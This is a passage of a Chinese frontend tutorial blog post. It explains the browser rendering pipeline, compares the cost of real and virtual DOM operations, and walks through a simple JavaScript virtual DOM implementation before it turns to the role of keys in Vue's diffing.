id="真实DOM和其解析流程"><a href="#真实DOM和其解析流程" class="headerlink" title="真实DOM和其解析流程"></a>真实<code>DOM</code>和其解析流程</h4><p>这里参考超级英雄大佬：<a href="https://juejin.cn/post/6844903895467032589">https://juejin.cn/post/6844903895467032589</a></p><p><code>webkit</code> 渲染引擎工作流程图</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/b32d88931ee775d57b382d7585de3ad8.png" alt="img"></p><blockquote><p>中文版</p></blockquote><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/cd1757feee540ef20c50b81af16d75ca.png" alt="img"></p><p>所有的浏览器渲染引擎工作流程大致分为5步：创建 <code>DOM</code> 树 —&gt; 创建 <code>Style Rules</code> -&gt; 构建 <code>Render</code> 树 —&gt; 布局<br><code>Layout</code> -—&gt; 绘制 <code>Painting</code>。</p><ul><li><p>第一步，构建 DOM 树：当浏览器接收到来自服务器响应的HTML文档后，会遍历文档节点，生成DOM树。需要注意的是在DOM树生成的过程中有可能会被CSS和JS的加载执行阻塞，渲染阻塞下面会讲到。</p></li><li><p>第二步，生成样式表：用 CSS 分析器，分析 CSS 文件和元素上的 inline 样式，生成页面的样式表；</p></li><li><p>渲染阻塞：当浏览器遇到一个script标签时，DOM构建将暂停，直到脚本加载执行，然后继续构建DOM树。每次去执行Javascript脚本都会严重阻塞DOM树构建，如果JavaScript脚本还操作了CSSOM，而正好这个CSSOM没有下载和构建，那么浏览器甚至会延迟脚本执行和构建DOM，直到这个CSSOM的下载和构建。所以，script标签引入很重要，实际使用时可以遵循下面两个原则：</p><ul><li><p>css优先：引入顺序上，css资源先于js资源</p></li><li><p>js后置：js代码放在底部，且js应尽量少影响DOM构建</p></li></ul></li></ul><blockquote><p>还有一个小知识：当解析html时，会把新来的元素插入dom树里，同时去查找css，然后把对应的样式规则应用到元素上，查找样式表是按照从右到左的顺序匹配的例如：div p {…}，会先寻找所有p标签并判断它的父标签是否为div之后才决定要不要采用这个样式渲染。所以平时写css尽量用class或者id，不要过度层叠</p></blockquote><ul><li><p>第三步，构建渲染树：通过DOM树和CSS规则我们可以构建渲染树。浏览器会从DOM树根节点开始遍历每个可见节点(注意是可见节点)对每个可见节点，找到其适配的CSS规则并应用。渲染树构建完后，每个节点都是可见节点并且都含有其内容和对应的规则的样式。这也是渲染树和DOM树最大的区别所在。渲染是用于显示，那些不可见的元素就不会在这棵树出现了。除此以外，display none的元素也不会被显示在这棵树里。visibility hidden的元素会出现在这棵树里。</p></li><li><p>第四步， <strong>渲染布局</strong> ：布局阶段会从渲染树的根节点开始遍历，然后确定每个节点对象在页面上的确切大小与位置，布局阶段的输出是一个盒子模型，它会精确地捕获每个元素在屏幕内的确切位置与大小。</p></li><li><p>第五步， <strong>渲染树绘制</strong> ：在绘制阶段，遍历渲染树，调用渲染器的paint()方法在屏幕上显示其内容。渲染树的绘制工作是由浏览器的UI后端组件完成的。</p></li></ul><p><strong>注意点 ：</strong></p><p><strong>1、<code>DOM</code> 树的构建是文档加载完成开始的？</strong> </p><p>构建 <code>DOM</code>树是一个渐进过程，为达到更好的用户体验，渲染引擎会尽快将内容显示在屏幕上，它不必等到整个 <code>HTML</code> 文档解析完成之后才开始构建 <code>render</code>树和布局。</p><p><strong>2、<code>Render</code> 树是 <code>DOM</code> 树和 <code>CSS</code> 样式表构建完毕后才开始构建的？</strong><br>这三个过程在实际进行的时候并不是完全独立的，而是会有交叉，会一边加载，一边解析，以及一边渲染。</p><p><strong>3、<code>CSS</code> 的解析注意点？</strong> </p><p><code>CSS</code> 的解析是从&#x3D;&#x3D;右往左逆向&#x3D;&#x3D;解析的，嵌套标签越多，解析越慢。</p><p><strong>4、<code>JS</code> 操作真实 <code>DOM</code>的代价？</strong></p><p>传统DOM结构操作方式对性能的影响很大，原因是频繁操作DOM结构操作会引起页面的重排(reflow)和重绘(repaint)，浏览器不得不频繁地计算布局，重新排列和绘制页面元素，导致浏览器产生巨大的性能开销。直接操作真实<code>DOM</code>的性能特别差，我们可以来演示一遍。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;app&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-comment">// 获取 DIV 元素</span></span><br><span class="language-javascript">    <span class="hljs-keyword">let</span> box = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;#app&#x27;</span>);</span><br><span class="language-javascript">    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(box);</span><br><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-comment">// 真实 DOM 操作</span></span><br><span class="language-javascript">    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">time</span>(<span class="hljs-string">&#x27;a&#x27;</span>);</span><br><span class="language-javascript">    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">10000</span>; i++) &#123;</span><br><span class="language-javascript">        box.<span class="hljs-property">innerHTML</span> = i;</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">timeEnd</span>(<span class="hljs-string">&#x27;a&#x27;</span>);</span><br><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-comment">// 虚拟 DOM 操作</span></span><br><span class="language-javascript">    <span class="hljs-keyword">let</span> num = <span class="hljs-number">0</span>;</span><br><span class="language-javascript">    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">time</span>(<span class="hljs-string">&#x27;b&#x27;</span>);</span><br><span class="language-javascript">    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">10000</span>; i++) &#123;</span><br><span class="language-javascript">        num = i;</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">    box.<span class="hljs-property">innerHTML</span> = num;</span><br><span class="language-javascript">    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">timeEnd</span>(<span class="hljs-string">&#x27;b&#x27;</span>);</span><br><span class="language-javascript"></span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br></code></pre></td></tr></table></figure><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124112747639.png" alt="image-20221124112747639" style="zoom: 80%;" /><blockquote><p>从结果中可以看出，操作真实 DOM 的性能是非常差的，所以我们要尽可能的复用，减少 DOM 操作。</p></blockquote><h4 id="虚拟-DOM-的好处"><a href="#虚拟-DOM-的好处" class="headerlink" title="虚拟 DOM 的好处"></a><strong>虚拟 DOM 的好处</strong></h4><p> 虚拟 <code>DOM</code> 就是为了解决浏览器性能问题而被设计出来的。如前，若一次操作中有 10 次更新 <code>DOM</code> 的动作，虚拟 <code>DOM</code> 不会立即操作<code>DOM</code>，而是将这 10 次更新的 <code>diff</code> 内容保存到本地一个 <code>JS</code> 对象中，最终将这个 <code>JS</code> 对象一次性 <code>attch</code> 到 <code>DOM</code>树上，再进行后续操作，避免大量无谓的计算量。所以，用 <code>JS</code> 对象模拟 <code>DOM</code> 节点的好处是，页面的更新可以先全部反映在 <code>JS</code> 对象(虚拟<br><code>DOM</code> )上，操作内存中的 <code>JS</code> 对象的速度显然要更快，等更新完成后，再将最终的 <code>JS</code> 对象映射成真实的 <code>DOM</code>，交由浏览器去绘制。</p><p> 虽然这一个虚拟 DOM 带来的一个优势，但并不是全部。虚拟 DOM 最大的优势在于抽象了原本的渲染过程，实现了跨平台的能力，而不仅仅局限于浏览器的DOM，可以是安卓和 IOS 的原生组件，可以是近期很火热的小程序，也可以是各种GUI。</p><p> 回到最开始的问题，虚拟 DOM 到底是什么，说简单点，就是一个普通的 JavaScript 对象，包含了<br><code>tag</code>、<code>props</code>、<code>children</code> 三个属性。</p><blockquote><p>接下来我们手动实现下 虚拟 DOM。</p><p>分两种实现方式：</p><p>一种原生 js DOM 操作实现；</p><p>另一种主流虚拟 DOM 库（snabbdom、virtual-dom）的实现（用h函数渲染）（暂时还不理解）</p></blockquote><p><strong>算法实现</strong></p><p><strong>（1）</strong>用 JS 对象模拟 DOM 树：</p>   <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;virtual-dom&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Virtual DOM<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;list&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;item&quot;</span>&gt;</span>Item 1<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;item&quot;</span>&gt;</span>Item 2<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;item&quot;</span>&gt;</span>Item 3<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>Hello World<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span> <br><br></code></pre></td></tr></table></figure><p>我们用 <code>JavaScript</code> 对象来表示 <code>DOM</code> 节点，使用对象的属性记录节点的类型、属性、子节点等。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Element virdual-dom 对象定义</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> &#123;<span class="hljs-type">String</span>&#125; <span class="hljs-variable">tagName</span> - dom 元素名称</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> &#123;<span class="hljs-type">Object</span>&#125; <span class="hljs-variable">props</span> - dom 属性</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> &#123;<span class="hljs-type">Array&lt;Element|String&gt;</span>&#125; - 子节点</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Element</span>(<span class="hljs-params">tagName, props, children</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">tagName</span> = tagName;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span> = props;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">children</span> = children;<br>    <span class="hljs-comment">// dom 元素的 key 值，用作唯一标识符</span><br>    <span class="hljs-keyword">if</span> (props.<span class="hljs-property">key</span>) &#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">key</span> = props.<span class="hljs-property">key</span><br>    &#125;<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">el</span>(<span class="hljs-params">tagName, props, children</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Element</span>(tagName, props, children);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>构建虚拟的 <code>DOM</code> ，用 javascript 对象来表示</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> ul = <span class="hljs-title function_">el</span>(<span class="hljs-string">&#x27;div&#x27;</span>, &#123; <span class="hljs-attr">id</span>: <span class="hljs-string">&#x27;Virtual DOM&#x27;</span> &#125;, [<br>    <span class="hljs-title function_">el</span>(<span class="hljs-string">&#x27;p&#x27;</span>, &#123;&#125;, [<span class="hljs-string">&#x27;Virtual DOM&#x27;</span>]),<br>    <span class="hljs-title function_">el</span>(<span class="hljs-string">&#x27;ul&#x27;</span>, &#123; <span class="hljs-attr">id</span>: <span class="hljs-string">&#x27;list&#x27;</span> &#125;, [<br>        <span class="hljs-title function_">el</span>(<span class="hljs-string">&#x27;li&#x27;</span>, &#123; <span class="hljs-attr">class</span>: <span class="hljs-string">&#x27;item&#x27;</span> &#125;, [<span class="hljs-string">&#x27;Item 1&#x27;</span>]),<br>        <span class="hljs-title function_">el</span>(<span class="hljs-string">&#x27;li&#x27;</span>, &#123; <span class="hljs-attr">class</span>: <span class="hljs-string">&#x27;item&#x27;</span> &#125;, [<span class="hljs-string">&#x27;Item 2&#x27;</span>]),<br>        <span class="hljs-title function_">el</span>(<span class="hljs-string">&#x27;li&#x27;</span>, &#123; <span class="hljs-attr">class</span>: <span class="hljs-string">&#x27;item&#x27;</span> &#125;, [<span class="hljs-string">&#x27;Item 3&#x27;</span>])<br>    ]),<br>    <span class="hljs-title function_">el</span>(<span class="hljs-string">&#x27;div&#x27;</span>, &#123;&#125;, [<span class="hljs-string">&#x27;Hello, World&#x27;</span>])<br>])<br><br></code></pre></td></tr></table></figure><p>现在 <code>ul</code> 就是我们用 <code>JavaScript</code> 对象表示的 <code>DOM</code> 结构，我们输出查看 <code>ul</code> 对应的数据结构如下：</p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124113145388.png" alt="image-20221124113145388" style="zoom: 67%;" /><p><strong>（2）</strong>将用 js 对象表示的虚拟 DOM 转换成真实 DOM：需要用到 js 原生操作 DOM 的方法。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * render 将virdual-dom 对象渲染为实际 DOM 元素</span><br><span class="hljs-comment"> */</span><br><span class="hljs-title class_">Element</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">render</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-comment">// 创建节点</span><br>    <span class="hljs-keyword">let</span> el = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">tagName</span>);<br><br>    <span class="hljs-keyword">let</span> props = <span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>;<br>    <span class="hljs-comment">// 设置节点的 DOM 属性</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> propName <span class="hljs-keyword">in</span> props) &#123;<br>        <span class="hljs-keyword">let</span> propValue = props[propName];<br>        el.<span class="hljs-title function_">setAttribute</span>(propName, propValue)<br>    &#125;<br><br>    <span class="hljs-keyword">let</span> children = <span class="hljs-variable language_">this</span>.<span class="hljs-property">children</span> || []<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> child <span class="hljs-keyword">of</span> children) &#123;<br>        <span class="hljs-keyword">let</span> childEl = (child <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Element</span>)<br>        ? child.<span class="hljs-title function_">render</span>() <span class="hljs-comment">// 如果子节点也是虚拟 DOM, 递归构建 DOM 节点</span><br>        : <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createTextNode</span>(child) <span class="hljs-comment">// 如果是文本，就构建文本节点</span><br><br>        el.<span class="hljs-title function_">appendChild</span>(childEl);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> el;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>我们通过查看以上 <code>render</code> 方法，会根据 <code>tagName</code> 构建一个真正的 <code>DOM</code>节点，然后设置这个节点的属性，最后递归地把自己的子节点也构建起来。</p><p>我们将构建好的 <code>DOM</code> 结构添加到页面 <code>body</code> 上面，如下：</p>   <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> ulRoot = ul.<span class="hljs-title function_">render</span>();<br><span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(ulRoot);<br><br></code></pre></td></tr></table></figure><p>这样，页面 <code>body</code> 里面就有真正的 <code>DOM</code> 结构，效果如下图所示：</p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124113734340.png" alt="image-20221124113734340" style="zoom:50%;" /><blockquote><p>我们知道虚拟 DOM 的好处和虚拟 DOM 的实现后就要讲讲 key 的作用了。</p><p>贴一下上面实现地完整代码</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-comment">/**</span></span><br><span class="hljs-comment"><span class="language-javascript">         * Element virdual-dom 对象定义</span></span><br><span class="hljs-comment"><span class="language-javascript">         * <span class="hljs-doctag">@param</span> &#123;<span class="hljs-type">String</span>&#125; <span class="hljs-variable">tagName</span> - dom 元素名称</span></span><br><span class="hljs-comment"><span class="language-javascript">         * <span class="hljs-doctag">@param</span> &#123;<span class="hljs-type">Object</span>&#125; <span class="hljs-variable">props</span> - dom 属性</span></span><br><span class="hljs-comment"><span class="language-javascript">         * <span class="hljs-doctag">@param</span> &#123;<span class="hljs-type">Array&lt;Element|String&gt;</span>&#125; - 子节点</span></span><br><span class="hljs-comment"><span class="language-javascript">         */</span></span><br><span class="language-javascript">    <span class="hljs-keyword">function</span> <span class="hljs-title function_">Element</span>(<span class="hljs-params">tagName, props, children</span>) &#123;</span><br><span class="language-javascript">        <span class="hljs-variable language_">this</span>.<span class="hljs-property">tagName</span> = tagName;</span><br><span class="language-javascript">        <span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span> = props;</span><br><span class="language-javascript">        <span class="hljs-variable language_">this</span>.<span class="hljs-property">children</span> = children;</span><br><span class="language-javascript">        <span class="hljs-comment">// dom 元素的 key 值，用作唯一标识符</span></span><br><span class="language-javascript">        <span class="hljs-keyword">if</span> (props.<span class="hljs-property">key</span>) &#123;</span><br><span class="language-javascript">            <span class="hljs-variable language_">this</span>.<span class="hljs-property">key</span> = props.<span class="hljs-property">key</span></span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">function</span> <span class="hljs-title function_">el</span>(<span class="hljs-params">tagName, props, children</span>) &#123;</span><br><span class="language-javascript">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Element</span>(tagName, props, children);</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">let</span> ul = <span class="hljs-title function_">el</span>(<span class="hljs-string">&#x27;div&#x27;</span>, &#123; <span class="hljs-attr">id</span>: <span class="hljs-string">&#x27;Virtual DOM&#x27;</span> &#125;, [</span><br><span class="language-javascript">        <span class="hljs-title function_">el</span>(<span class="hljs-string">&#x27;p&#x27;</span>, &#123;&#125;, [<span class="hljs-string">&#x27;Virtual DOM&#x27;</span>]),</span><br><span class="language-javascript">        <span class="hljs-title function_">el</span>(<span class="hljs-string">&#x27;ul&#x27;</span>, &#123; <span class="hljs-attr">id</span>: <span class="hljs-string">&#x27;list&#x27;</span> &#125;, [</span><br><span class="language-javascript">            <span class="hljs-title function_">el</span>(<span class="hljs-string">&#x27;li&#x27;</span>, &#123; <span class="hljs-attr">class</span>: <span class="hljs-string">&#x27;item&#x27;</span> &#125;, [<span class="hljs-string">&#x27;Item 1&#x27;</span>]),</span><br><span class="language-javascript">            <span class="hljs-title function_">el</span>(<span class="hljs-string">&#x27;li&#x27;</span>, &#123; <span class="hljs-attr">class</span>: <span class="hljs-string">&#x27;item&#x27;</span> &#125;, [<span class="hljs-string">&#x27;Item 2&#x27;</span>]),</span><br><span class="language-javascript">            <span class="hljs-title function_">el</span>(<span class="hljs-string">&#x27;li&#x27;</span>, &#123; <span class="hljs-attr">class</span>: <span class="hljs-string">&#x27;item&#x27;</span> &#125;, [<span class="hljs-string">&#x27;Item 3&#x27;</span>])</span><br><span class="language-javascript">        ]),</span><br><span class="language-javascript">        <span class="hljs-title function_">el</span>(<span class="hljs-string">&#x27;div&#x27;</span>, &#123;&#125;, [<span class="hljs-string">&#x27;Hello, World&#x27;</span>])</span><br><span class="language-javascript">    ])</span><br><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-comment">/**</span></span><br><span class="hljs-comment"><span class="language-javascript">             * render 将virdual-dom 对象渲染为实际 DOM 元素</span></span><br><span class="hljs-comment"><span class="language-javascript">             */</span></span><br><span class="language-javascript">    <span class="hljs-title class_">Element</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">render</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">        <span class="hljs-comment">// 创建节点</span></span><br><span class="language-javascript">        <span class="hljs-keyword">let</span> el = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">tagName</span>);</span><br><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-keyword">let</span> props = <span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>;</span><br><span class="language-javascript">        <span class="hljs-comment">// 设置节点的 DOM 属性</span></span><br><span class="language-javascript">        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> propName <span class="hljs-keyword">in</span> props) &#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">let</span> propValue = props[propName];</span><br><span class="language-javascript">            el.<span class="hljs-title function_">setAttribute</span>(propName, propValue)</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-keyword">let</span> children = <span class="hljs-variable language_">this</span>.<span class="hljs-property">children</span> || []</span><br><span class="language-javascript">        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> child <span class="hljs-keyword">of</span> children) &#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">let</span> childEl = (child <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Element</span>)</span><br><span class="language-javascript">            ? child.<span class="hljs-title function_">render</span>() <span class="hljs-comment">// 如果子节点也是虚拟 DOM, 递归构建 DOM 节点</span></span><br><span class="language-javascript">            : <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createTextNode</span>(child) <span class="hljs-comment">// 如果是文本，就构建文本节点</span></span><br><span class="language-javascript"></span><br><span class="language-javascript">            el.<span class="hljs-title function_">appendChild</span>(childEl);</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-keyword">return</span> el;</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">let</span> ulRoot = ul.<span class="hljs-title function_">render</span>();</span><br><span class="language-javascript">    <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(ulRoot);</span><br><span class="language-javascript">    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(ul);</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="虚拟DOM中key的作用"><a href="#虚拟DOM中key的作用" class="headerlink" title="虚拟DOM中key的作用"></a><strong>虚拟DOM中key的作用</strong></h4><p>key是虚拟DOM对象的标识，当数据发生变化时，Vue会根据【新数据】生成【新的虚拟DOM】,<br>随后Vue进行【新虚拟DOM】与【旧虚拟DOM】的差异比较，比较规则如下：</p><ul><li>旧虚拟DOM中找到了与新虚拟DOM相同的key：<ul><li>①.若虚拟DOM中内容没变, 直接使用之前的真实DOM！</li><li>②.若虚拟DOM中内容变了, 则生成新的真实DOM，随后替换掉页面中之前的真实DOM。</li></ul></li><li>旧虚拟DOM中未找到与新虚拟DOM相同的key <ul><li>创建新的真实DOM，随后渲染到到页面。</li></ul></li></ul><blockquote><p>好了，我们知道了最简单的key的原理，如果要继续研究下去就要涉及到vue的核心之一-Diff算法，后面会详细介绍。</p></blockquote><h3 id="用index作为key可能会引发的问题："><a href="#用index作为key可能会引发的问题：" class="headerlink" title="用index作为key可能会引发的问题："></a>用index作为key可能会引发的问题：</h3><p><strong>若对数据进行 ：逆序添加、逆序删除等破坏顺序操作：</strong></p><p>会产生没有必要的真实DOM更新 &#x3D;&#x3D;&gt; 界面效果没问题, 但效率低。</p><blockquote><p>案例</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- 准备好一个容器--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- 遍历数组 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>人员列表（遍历数组）<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span 